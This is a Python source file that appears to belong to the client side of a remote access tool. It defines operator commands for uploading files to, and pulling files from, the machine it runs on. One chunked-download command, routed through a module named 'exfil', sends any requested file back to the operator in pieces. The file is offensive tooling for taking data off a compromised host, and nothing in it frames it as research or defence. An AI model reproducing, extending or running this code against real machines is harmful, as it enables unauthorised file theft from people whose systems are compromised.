from client.commands.base import Command
from client.modules.file_ops import download_file, upload_file
from client.modules.exfil.transfer import chunked_upload


class UploadCommand(Command):
    name = 'upload'

    def execute(self, ctx, raw: str):
        file_name = raw[7:].strip()
        download_file(ctx.protocol, file_name)
        ctx.protocol.send(f'[+] File received: {file_name}')
        return True


class DownloadCommand(Command):
    name = 'download'

    def execute(self, ctx, raw: str):
        file_name = raw[9:].strip()
        upload_file(ctx.protocol, file_name)
        return True


class ChunkedDownloadCommand(Command):
    name = 'chunked_download'

    def execute(self, ctx, raw: str):
        args = raw[17:].strip().split()
        if not args:
            ctx.protocol.send('[-] Usage: chunked_download <file_path> [chunk_size_kb]')
            return True
        file_path = args[0]
        chunk_size = int(args[1]) * 1024 if len(args) > 1 else 512 * 1024
        chunked_upload(ctx.protocol, file_path, chunk_size)
        return True
